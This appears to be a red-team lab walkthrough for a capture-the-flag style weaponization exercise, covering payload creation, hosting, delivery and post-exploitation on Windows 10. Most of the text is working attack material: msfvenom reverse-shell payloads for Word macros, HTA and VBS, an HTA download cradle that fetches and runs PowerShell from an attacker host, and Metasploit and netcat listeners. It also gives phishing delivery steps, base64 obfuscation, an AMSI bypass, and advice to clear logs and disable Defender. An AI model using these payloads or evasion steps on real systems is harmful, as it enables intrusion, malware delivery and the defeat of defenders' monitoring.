# Practice Area

For reference, you can use the MSFVenom Cheat Sheet on this [**website**](https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/)

## Complete Lab Walkthrough

## Scenario

Red team operator needs to establish C2 on a simulated corporate network. Target environment:

- Windows 10 machines
- User simulation for initial access
- Network segmentation
- Various detection controls

## Phase 1: Reconnaissance

**Information gathering (not covered in detail here):**

- Identify target email addresses
- Determine technology stack
- Find email/web security controls
- Research organization structure

## Phase 2: Payload Generation

### Option A: VBA in Word Document

**Generate VBA payload:**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -f vba > payload.vba
```

**Create Word document:**

1. Open Microsoft Word
2. Developer tab → Visual Basic
3. Paste VBA payload
4. Save as `report.doc` (Word 97-2003)
5. Close document

### Option B: HTA with PowerShell

**Generate PowerShell payload:**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -f psh -o payload.ps1
```

**Create HTA file:**

```
<html>
<body>
<script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://X.X.X.X:8080/payload.ps1')");</script>
</body>
</html>
```

**Save as:** `payload.hta`

### Option C: VBS Payload

**Generate VBS payload:**

```
msfvenom -p windows/shell_reverse_tcp LHOST=X.X.X.X LPORT=1337 -f vbs > payload.vbs
```

## Phase 3: Payload Hosting

**Set up web server:**

```
# For HTA + PowerShell delivery
cd /path/containing/payloads
python3 -m http.server 8080

# Verify serving
# http://X.X.X.X:8080/payload.hta
# http://X.X.X.X:8080/payload.ps1
```

## Phase 4: Command & Control Setup

### For Metasploit Handler

```
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST X.X.X.X
set LPORT 443
exploit
```

### For Netcat Listener

```
nc -lvp 1337
```

## Phase 5: Payload Delivery

### Via Web Simulator

1. Navigate to `http://X.X.X.X:8080/` (simulator)
2. Upload payload file (DOC, VBS, PS1)
3. OR enter HTA URL: `http://X.X.X.X:8080/payload.hta`
4. Submit/Send

### Via Email (In Real Scenario)

1. Craft phishing email with attachment
2. Include social engineering pretext
3. Send to target
4. Victim opens attachment
5. Enable macros/script execution
6. Reverse shell established

## Phase 6: Initial Access

**Expected indicators:**

- Web server logs show file access
- C2 listener receives incoming connection
- Meterpreter session established
- Command prompt/shell available

## Phase 7: Post-Exploitation

### Process Migration (Metasploit)

```
meterpreter > run post/windows/manage/migrate
[*] Running module against TARGET-MACHINE
[*] Current server process: powershell.exe (5432)
[*] Spawning notepad.exe process to migrate into
[*] Migrating into 6180
[+] Successfully migrated into process 6180
```

**Why migrate?**

- Payload process (Word, PowerShell) may close
- Migrated process provides stability
- Avoids detection of suspicious parent processes

### System Enumeration

```
meterpreter > sysinfo
Computer        : DESKTOP-XXXX
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Logged On Users : 2

meterpreter > getuid
Server username : DOMAIN\USERNAME

meterpreter > shell
C:\Users\Username> whoami
domain\username

C:\Users\Username> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet:
   IPv4 Address . . . . . . . . . . : X.X.X.X
   Subnet Mask . . . . . . . . . . : X.X.X.X
```

### Locating Flag

```
meterpreter > shell
C:\Users\Username> cd C:\Users\thm\Desktop
C:\Users\thm\Desktop> dir
 Volume in drive C has no label.
 Directory of C:\Users\thm\Desktop

06/14/2026  02:45 AM                 45 flag.txt

C:\Users\thm\Desktop> type flag.txt
THM{WEAPONIZATION_COMPLETE}
```

## Advanced Techniques

## Evasion Methods

### Code Obfuscation

**VBScript obfuscation:**

```
Dim a, b, c
a = "cmd" & ".exe"
b = CreateObject("W" & "Script" & ".Shell")
c = "calc.exe"
b.Run a & " /c " & c
```

### String Concatenation

```
$c = "cal" + "c.exe"
Start-Process $c
```

### Base64 Encoding

```
# Encode
[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("IEX(New-Object System.Net.WebClient).DownloadString('http://X.X.X.X:8080/payload.ps1')"))

# Decode and execute
powershell -c "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ENCODED_STRING')) | IEX"
```

## Anti-Forensics Considerations

- Clear event logs after execution
- Remove temporary files
- Disable Windows Defender temporarily
- Use living-off-the-land binaries (LOLBins)
- Employ process injection to hide execution

## Detection Evasion

**AMSI (Antimalware Scan Interface) Bypass:**

```
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

**Execution Policy Bypass:**

```
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

## Best Practices for Red Teamers

## Operational Security (OPSEC)

**Use dedicated infrastructure**

- Separate C2 servers from staging servers
- Use VPNs/proxies for all connections
- Rotate domains regularly

**Traffic obfuscation**

- Use HTTPS with valid certificates
- Implement sleep timers in beacons
- Randomize beacon check-in patterns

**Artifact management**

- Clean logs after operations
- Remove payloads after execution
- Use memory-only execution where possible

**Isolation**

- Test payloads in isolated lab environment
- Document all changes for rollback
- Keep payload staging separate from C2

## Engagement Rules

- **Always obtain written authorization** before testing
- **Define scope clearly** with client
- **Establish rules of engagement** to prevent business impact
- **Document all activities** for reporting
- **Maintain professional communication** with stakeholders

## Reporting

- **Executive summary** - Business impact and risk
- **Technical details** - Attack chain and techniques used
- **Artifacts** - Commands executed, files created
- **Recommendations** - Detection and mitigation strategies
- **Timeline** - When each action occurred

## Common Pitfalls and Solutions

## Payload Won't Execute

**Issues:**

- Execution policy blocks scripts
- User doesn't have required permissions
- File extensions blocked by network/endpoint

**Solutions:**

- Use bypass flags (`ep bypass`, `ex bypass`)
- Test with different file extensions (.txt, .ps1, .vbs)
- Ensure files served with correct MIME types
- Use LOLBins (Windows native executables)

## Session Dies Immediately

**Issues:**

- Parent process closes (Word, PowerShell)
- Payload process not properly spawned
- Network connectivity issues

**Solutions:**

- Implement process migration
- Use inject technique instead of spawn
- Implement persistent connectivity (reconnection logic)
- Check firewall rules between attacker and target

## Detection and Blocking

**Common detection vectors:**

- File hashing (check against known malware)
- Behavioral analysis (suspicious API calls)
- Code signing validation
- Macro analysis in Office documents

**Mitigation:**

- Obfuscate code
- Use legitimate tools (LOLBins)
- Implement anti-analysis techniques
- Use encrypted/encoded payloads

## Tools Reference

## Payload Generation

- **msfvenom** - Metasploit payload generator
- **msfconsole** - Metasploit framework console
- **Cobalt Strike** - Commercial C2 platform
- **PowerShell Empire** - Open-source C2

## Delivery and Hosting

- **Python HTTP Server** - `python3 -m http.server [PORT]`
- **Apache/Nginx** - Web server hosting
- **phishing email** - Custom smtp server

## Post-Exploitation

- **Metasploit modules** - Windows enumeration, credential dumping
- **PowerShell** - Native scripting for Windows
- **impacket** - Network protocol toolkit
- **Mimikatz** - Windows credential dumping (via Metasploit)

## Operational Support

- **netcat** - Network utility for shells
- **tmux/screen** - Terminal multiplexing
- **burp suite** - Web traffic analysis
- **wireshark** - Network packet analysis

## Conclusion

The weaponization phase is critical in offensive security operations. This article covered:

- **WSH/VBScript** - System-level script execution
- **HTA** - Browser-delivered applications
- **VBA Macros** - Office document exploitation
- **PowerShell** - Advanced Windows scripting
- **Delivery Methods** - Email, web, physical
- **C2 Frameworks** - Metasploit, Cobalt Strike, Empire
- **Lab Demonstrations** - Complete end-to-end attack chains

## Key Takeaways

1. **Understand each technique's strengths** - Different payloads suit different scenarios
2. **Maintain OPSEC discipline** - Infrastructure, traffic, and artifact management
3. **Practice in authorized environments** - Build skills safely before real engagements
4. **Stay updated** - Detection methods evolve; continuously adapt techniques
5. **Documentation matters** - Clear records enable effective team collaboration and reporting